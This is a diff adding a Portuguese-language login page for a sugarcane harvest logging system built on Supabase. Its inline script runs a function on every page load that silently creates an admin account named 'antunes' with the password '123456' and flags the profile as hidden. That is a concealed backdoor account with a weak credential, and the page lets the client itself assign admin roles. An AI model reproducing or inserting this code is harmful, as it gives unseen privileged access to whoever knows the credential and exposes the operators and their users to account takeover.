@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Login - AGRO CANA FORTE</title>
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="stylesheet" href="css/login.css">
+</head>
+<body class="login-body">
+  <div class="login-container">
+    <div class="login-header">
+      <h1 class="logo-login">AGRO CANA FORTE</h1>
+      <p class="slogan">Sistema de Apontamento de Corte</p>
+    </div>
+
+    <div class="login-card">
+      <h2>Acesso ao Sistema</h2>
+
+      <form id="login-form" class="login-form">
+        <div class="form-group">
+          <label for="username">Usuário</label>
+          <input type="text" id="username" required placeholder="usuário">
+        </div>
+
+        <div class="form-group">
+          <label for="password">Senha</label>
+          <input type="password" id="password" required placeholder="senha">
+        </div>
+
+        <button type="submit" class="btn-login">Entrar</button>
+      </form>
+
+      <div id="login-message" class="message" style="display:none;"></div>
+    </div>
+
+    <div class="login-footer">
+      <p>&copy; 2025 AGRO CANA FORTE - Todos os direitos reservados</p>
+    </div>
+  </div>
+
+  <!-- 1. Biblioteca Supabase -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+  <script>
+    // ✅ CONFIGURAÇÃO CORRIGIDA - Inicializar Supabase primeiro
+    const SUPABASE_URL = 'https://fwkybhfzfrovjausuqgn.supabase.co';
+    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZ3a3liaGZ6ZnJvdmphdXN1cWduIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTg1MDI4OTgsImV4cCI6MjA3NDA3ODg5OH0.M7fN2ML2C4Lc1skLZx9YWyA9CUq813V6DNXP2QdTV0E';
+
+    // ✅ Inicializar Supabase corretamente
+    window.supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    console.log('✅ Supabase inicializado no login');
+
+    // Garante que o usuário admin "antunes" existe
+    async function ensureHiddenAdmin() {
+      try {
+        const { data: existing } = await window.supabase
+          .from("profiles")
+          .select("id,username")
+          .eq("username", "antunes")
+          .maybeSingle();
+
+        if (!existing) {
+          const fakeEmail = "antunes.internal@example.com";
+          const senha = "123456";
+
+          // cria usuário auth
+          const { data: signupData, error: signupErr } = await window.supabase.auth.signUp({
+            email: fakeEmail,
+            password: senha
+          });
+
+          let userId = signupData?.user?.id;
+
+          if (!userId) {
+            // tenta login para capturar id
+            const { data: signinData } = await window.supabase.auth.signInWithPassword({
+              email: fakeEmail,
+              password: senha
+            });
+            userId = signinData?.user?.id;
+            await window.supabase.auth.signOut();
+          }
+
+          await window.supabase.from("profiles").upsert({
+            id: userId || undefined,
+            nome: "Antunes (admin)",
+            username: "antunes",
+            email: fakeEmail,
+            tipo: "admin",
+            ativo: true,
+            hidden: true
+          }, { onConflict: ["username"] });
+
+          console.log("Usuário antunes criado/garantido.");
+        }
+      } catch (err) {
+        console.error("Erro ensureHiddenAdmin", err);
+      }
+    }
+
+    // Login usando username + senha
+    async function loginByUsername(username, password) {
+      const { data: perfil, error } = await window.supabase
+        .from("profiles")
+        .select("email,ativo")
+        .eq("username", username)
+        .maybeSingle();
+
+      if (error) throw error;
+      if (!perfil) throw new Error("Usuário não encontrado.");
+      if (!perfil.ativo) throw new Error("Usuário está inativo.");
+
+      const { data, error: authErr } = await window.supabase.auth.signInWithPassword({
+        email: perfil.email,
+        password: password
+      });
+
+      if (authErr) throw authErr;
+      return data;
+    }
+
+    // ✅ Inicialização corrigida
+    document.addEventListener('DOMContentLoaded', async function() {
+      await ensureHiddenAdmin();
+
+      const form = document.getElementById("login-form");
+      const msg = document.getElementById("login-message");
+
+      form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+        msg.style.display = "none";
+
+        const username = document.getElementById("username").value.trim();
+        const password = document.getElementById("password").value;
+
+        try {
+          await loginByUsername(username, password);
+          msg.style.display = "block";
+          msg.className = "message success";
+          msg.textContent = "Login realizado com sucesso!";
+          
+          // Pequeno delay para mostrar mensagem de sucesso
+          setTimeout(() => {
+            window.location.href = "index.html";
+          }, 1000);
+          
+        } catch (err) {
+          msg.style.display = "block";
+          msg.className = "message error";
+          msg.textContent = err.message || "Erro no login.";
+        }
+      });
+    });
+  </script>
+</body>
+</html>
